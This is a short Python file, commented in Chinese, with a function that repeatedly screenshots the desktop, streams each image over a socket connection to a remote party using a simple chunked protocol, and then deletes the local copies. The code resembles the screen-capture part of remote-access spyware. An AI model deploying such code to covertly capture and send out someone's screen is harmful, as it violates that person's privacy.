import pyautogui
import os
import struct
import time
import shutil


def screenshot(client, num_screenshots):
    count = 0
    # 獲取當前時間戳作為目錄名稱
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    dir_name = f"screenshots_{timestamp}"

    # 創建目錄
    os.makedirs(dir_name, exist_ok=True)

    while count < num_screenshots:
        try:
            # 使用 pyautogui 截圖
            img = pyautogui.screenshot()
            count += 1
            img_filename = os.path.join(dir_name, f"screenshot_{count}.jpg")
            img.save(img_filename)
            time.sleep(1)

            # 分包傳輸文件
            if os.path.isfile(img_filename):
                try:
                    # 每個包大小128 bytes
                    filename = os.path.basename(img_filename).encode('utf-8')
                    filename_padded = filename.ljust(128, b'\x00')  # 確保文件名長度為128字節
                    fileinfo = struct.pack("128sl", filename_padded, os.stat(img_filename).st_size)

                    client.send(fileinfo)

                    # 資料分段發送
                    with open(img_filename, "rb") as fileobj:
                        while True:
                            sendfiledata = fileobj.read(1024)
                            if not sendfiledata:
                                print(f"{img_filename} 文件發送完畢")
                                break
                            client.send(sendfiledata)

                    # 發送結束標誌
                    client.send(b"END")

                except Exception as e:
                    print(f"發送文件 {img_filename} 時發生錯誤: {e}")

        except Exception as e:
            print(f"截圖或文件處理時發生錯誤: {e}")

    # 清理目錄（可選）
    try:
        shutil.rmtree(dir_name)
    except Exception as e:
        print(f"清理目錄 {dir_name} 時發生錯誤: {e}")
